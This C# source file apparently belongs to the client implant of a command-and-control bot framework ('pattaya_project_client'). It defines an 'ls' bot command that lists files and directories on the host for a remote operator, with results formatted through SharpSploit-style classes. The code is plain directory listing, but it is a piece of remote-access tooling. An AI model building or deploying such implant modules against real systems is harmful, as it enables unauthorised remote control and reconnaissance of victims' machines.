using pattaya_project_client.Commands.Interfaces;
using pattaya_project_client.Models;
using pattaya_project_client.Services;
using System.Collections.Generic;
using System.IO;

namespace pattaya_project_client.Commands.Implements
{
    public class ListDirectory : BotCommand
    {
        public override string TaskName => "ls";

        public override BotTaskResult RunTask(BotTask task)
        {
            var results = new SharpSploitResultList<ListDirectoryResult>();
            string path;
            var arguments = task.Arguments.Split(' ');
            if (arguments is null || arguments.Length == 0 || arguments[0] == "")
            {
                path = Directory.GetCurrentDirectory();
            }
            else
            {
                path = arguments[0];
            }

            var files = Directory.GetFiles(path);
            foreach (var file in files)
            {
                var fileInfo = new FileInfo(file);
                results.Add(new ListDirectoryResult
                {
                    Name = fileInfo.FullName,
                    Length = fileInfo.Length
                });

            }

            var directories = Directory.GetDirectories(path);
            foreach (var directory in directories)
            {
                var dirInfo = new DirectoryInfo(directory);
                results.Add(new ListDirectoryResult
                {
                    Name = dirInfo.Name,
                    Length = 0
                });
            }

            return new BotTaskResult
            {
                TaskId = task.TaskId,
                Result = results.ToString()
        };

        }
    }

    public sealed class ListDirectoryResult : SharpSploitResult
    {
        public string Name { get; set; }
        public long Length { get; set; }

        protected internal override IList<SharpSploitResultProperty> ResultProperties => new List<SharpSploitResultProperty>
        {
            new SharpSploitResultProperty
            {
                Name = nameof(Name),
                Value = Name
            },
            new SharpSploitResultProperty
            {
                Name = nameof(Length),
                Value = Length
            },
        };
    }
}
